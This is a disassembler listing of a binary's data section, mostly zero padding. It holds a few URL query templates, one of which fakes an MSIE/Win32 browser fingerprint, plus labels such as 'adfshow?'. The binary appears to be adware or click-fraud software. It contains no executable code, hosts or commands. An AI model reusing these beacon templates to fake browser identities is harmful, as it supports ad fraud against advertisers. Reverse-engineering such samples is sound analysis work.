                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  74h ; t
                db  70h ; p
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  63h ; c
                db  63h ; c
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Dh ; m
                db  62h ; b
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  72h ; r
                db  6Eh ; n
                db  64h ; d
                db  3Dh ; =
                db  33h ; 3
                db  32h ; 2
                db  39h ; 9
                db  30h ; 0
                db  36h ; 6
                db  26h ; &
                db  64h ; d
                db  69h ; i
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  63h ; c
                db  67h ; g
                db  3Dh ; =
                db  30h ; 0
                db  26h ; &
                db  63h ; c
                db  63h ; c
                db  3Dh ; =
                db  30h ; 0
                db  26h ; &
                db  70h ; p
                db  69h ; i
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  63h ; c
                db  64h ; d
                db  3Dh ; =
                db  33h ; 3
                db  32h ; 2
                db  26h ; &
                db  70h ; p
                db  73h ; s
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Ah ; j
                db  65h ; e
                db  3Dh ; =
                db  79h ; y
                db  26h ; &
                db  63h ; c
                db  6Bh ; k
                db  3Dh ; =
                db  79h ; y
                db  26h ; &
                db  63h ; c
                db  74h ; t
                db  3Dh ; =
                db  26h ; &
                db  74h ; t
                db  70h ; p
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  66h ; f
                db  6Ch ; l
                db  3Dh ; =
                db  31h ; 1
                db  30h ; 0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aMain           db 'main?',0            ; DATA XREF: sub_404110+37↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  75h ; u
                db  73h ; s
                db  72h ; r
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ch ; l
                db  6Fh ; o
                db  61h ; a
                db  6Ch ; l
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ah ; j
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  64h ; d
                db  62h ; b
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  62h ; b
                db  75h ; u
                db  74h ; t
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  78h ; x
                db  6Fh ; o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  56h ; V
                db  3Dh ; =
                db  32h ; 2
                db  26h ; &
                db  43h ; C
                db  49h ; I
                db  3Dh ; =
                db  61h ; a
                db  6Eh ; n
                db  3Ah ; :
                db  4Dh ; M
                db  53h ; S
                db  49h ; I
                db  45h ; E
                db  7Ch ; |
                db  63h ; c
                db  70h ; p
                db  75h ; u
                db  3Ah ; :
                db  78h ; x
                db  38h ; 8
                db  36h ; 6
                db  7Ch ; |
                db  70h ; p
                db  66h ; f
                db  3Ah ; :
                db  57h ; W
                db  69h ; i
                db  6Eh ; n
                db  33h ; 3
                db  32h ; 2
                db  7Ch ; |
                db  6Ah ; j
                db  76h ; v
                db  3Ah ; :
                db  31h ; 1
                db  2Eh ; .
                db  33h ; 3
                db  7Ch ; |
                db  66h ; f
                db  76h ; v
                db  3Ah ; :
                db  31h ; 1
                db  30h ; 0
                db  26h ; &
                db  75h ; u
                db  73h ; s
                db  72h ; r
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  50h ; P
                db  49h ; I
                db  3Dh ; =
                db  73h ; s
                db  74h ; t
                db  3Ah ; :
                db  31h ; 1
                db  32h ; 2
                db  7Ch ; |
                db  65h ; e
                db  74h ; t
                db  3Ah ; :
                db  31h ; 1
                db  7Ch ; |
                db  68h ; h
                db  70h ; p
                db  3Ah ; :
                db  4Eh ; N
                db  7Ch ; |
                db  75h ; u
                db  6Eh ; n
                db  3Ah ; :
                db  7Ch ; |
                db  75h ; u
                db  6Fh ; o
                db  3Ah ; :
                db  7Ch ; |
                db  61h ; a
                db  65h ; e
                db  3Ah ; :
                db  26h ; &
                db  6Ch ; l
                db  6Fh ; o
                db  61h ; a
                db  6Ch ; l
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Ah ; j
                db  73h ; s
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  64h ; d
                db  62h ; b
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  45h ; E
                db  58h ; X
                db  3Dh ; =
                db  65h ; e
                db  78h ; x
                db  31h ; 1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aAdfshow        db 'adfshow?',0         ; DATA XREF: sub_404110+49↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  73h ; s
                db  6Ch ; l
                db  6Fh ; o
                db  74h ; t
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Dh ; m
                db  61h ; a
                db  79h ; y
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ah ; j
                db  69h ; i
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  63h ; c
                db  77h ; w
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
